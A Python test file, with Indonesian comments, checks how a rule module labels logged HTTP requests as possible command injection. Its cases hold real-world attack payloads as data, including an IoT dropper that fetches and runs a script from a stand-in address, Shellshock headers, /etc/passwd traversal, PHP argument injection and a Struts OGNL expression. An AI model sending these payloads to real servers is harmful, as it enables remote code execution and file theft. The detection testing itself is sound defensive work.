import pandas as pd

from src.data.gate.command import LABELS, RULES, evaluate
from src.data.gate.common import OUTPUT_COLUMNS

L88, L248 = LABELS
TEXT = [
    "uri_dec", "ua_dec", "ref_dec", "body_dec", "cookie_dec", "request_host", "request_origin", "request_content_type",
    "request_accept", "request_accept_language", "request_accept_encoding", "request_connection", "request_do_not_track",
]
IOT_DROPPER = '/cgi-bin/kerbynet?Section=NoAuthREQ&type=*";cd /tmp;curl -O http://192.0.2.1/zero;sh zero;"'
SHELLSHOCK = "() { :;}; /bin/sleep 15"

# row_id -> (field yang diisi, (candidate, reason, rule_id) yang diharapkan untuk label 88)
CASES = {
    1: ({"uri_dec": "/a.js?ver=4.9.5|sleep 15#"}, ("CMD_INJECTION", "", "C1")),
    2: ({"ua_dec": "() { :;}; /bin/sleep 15"}, ("CMD_INJECTION", "", "C1")),
    3: ({"uri_dec": "/feed/?-d allow_url_include=1 -d auto_prepend_file=php://input"}, ("CMD_INJECTION", "", "C1")),
    4: ({"uri_dec": "/a.js?ver=../../../../etc/passwd&b=';cat /etc/passwd;'"}, ("CMD_INJECTION", "", "C1")),
    5: ({"uri_dec": "/a.js?ver=../../../../../../etc/passwd"}, ("", "", "C2")),
    6: ({"uri_dec": "/zimbra/a.js?skin=../../../../etc/passwd\x00"}, ("", "", "C2")),
    7: ({"uri_dec": "/p/?action=${@print(chr(122).chr(97))}&x=../../"}, ("", "", "C2")),
    8: ({"uri_dec": "/p/?action=${@print(chr(122).chr(97))}"}, ("", "OUT_OF_SCOPE", "C3")),
    9: ({"ref_dec": "http://test-site.com/?q=${1234 5678}"}, ("", "OUT_OF_SCOPE", "C3")),
    10: ({"uri_dec": "/edit-password/", "body_dec": "redirect=`cat /etc/passwd`"}, ("", "HIDDEN_EVIDENCE", "C4")),
    11: ({"request_content_type": "() { :;}; echo X-Powered-By: ShellShock-Vulnerable"}, ("", "HIDDEN_EVIDENCE", "C4")),
    12: ({"uri_dec": "/blog/wp-login.php", "body_dec": "log=\x00${1 2}"}, ("", "HIDDEN_EVIDENCE", "C4")),
    13: ({"body_dec": "username=rafael&password=x", "cookie_dec": "author_email=foo-bar@example.com"}, ("", "NO_EVIDENCE", "C5")),
    14: ({"uri_dec": '/x/?user_login="><!--#EXEC cmd="ls /"--><'}, ("CMD_INJECTION", "", "C1")),
    15: ({"uri_dec": IOT_DROPPER}, ("CMD_INJECTION", "", "C1")),
    16: ({"uri_dec": "/a.js?ver=/etc/passwd"}, ("", "", "C2")),
    17: ({"uri_dec": "/edit-password/", "body_dec": "redirect=../../../../etc/passwd"}, ("", "HIDDEN_EVIDENCE", "C4")),
    18: ({"request_origin": SHELLSHOCK}, ("", "HIDDEN_EVIDENCE", "C4")),
    19: ({"request_accept": SHELLSHOCK}, ("", "HIDDEN_EVIDENCE", "C4")),
    20: ({"request_accept_language": SHELLSHOCK}, ("", "HIDDEN_EVIDENCE", "C4")),
    21: ({"cookie_dec": "c=;sleep 15;"}, ("", "HIDDEN_EVIDENCE", "C4")),
}


def frame(rows):
    """Baris sintetis berindeks row_id dengan semua kolom yang dibaca modul; bawaan: hanya label 88 aktif."""
    base = {L88: 1, L248: 0, **dict.fromkeys(TEXT, "")}
    return pd.DataFrame.from_dict({rid: {**base, **fields} for rid, fields in rows.items()}, orient="index")


def test_rules_c1_to_c5():
    out = evaluate(frame({rid: fields for rid, (fields, _) in CASES.items()}))
    assert list(out.columns) == OUTPUT_COLUMNS
    assert (out["label"] == L88).all() and not out["weak"].any()
    got = {rid: tuple(row) for rid, row in out[["candidate", "reason", "rule_id"]].iterrows()}
    assert got == {rid: expected for rid, (_, expected) in CASES.items()}
    assert set(out["rule_id"]) | {"C0"} == set(RULES)


def test_label_248_is_neutral_and_unlabeled_rows_are_skipped():
    struts = "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Check-Struts', 'x')}"
    df = frame({
        4745: {L88: "0", L248: "1", "ua_dec": "Nmap Scripting Engine", "request_content_type": struts},
        7: {L88: "1", L248: "1", "uri_dec": "/?a=;sleep 15;"},
        8: {L88: "0", L248: "0", "uri_dec": "/?a=;sleep 15;"},
    })
    out = evaluate(df)
    assert sorted(zip(out.index, out["label"], out["rule_id"])) == [(7, L248, "C0"), (7, L88, "C1"), (4745, L248, "C0")]
    assert (out.loc[out["label"] == L248, ["candidate", "reason"]] == "").all().all()


def test_values_differing_only_after_nul_are_judged_separately():
    out = evaluate(frame({1: {"uri_dec": "/a.js?ver=1\x00;sleep 15;"}, 2: {"uri_dec": "/a.js?ver=1\x00"}}))
    assert out["rule_id"].to_dict() == {1: "C1", 2: "C5"}
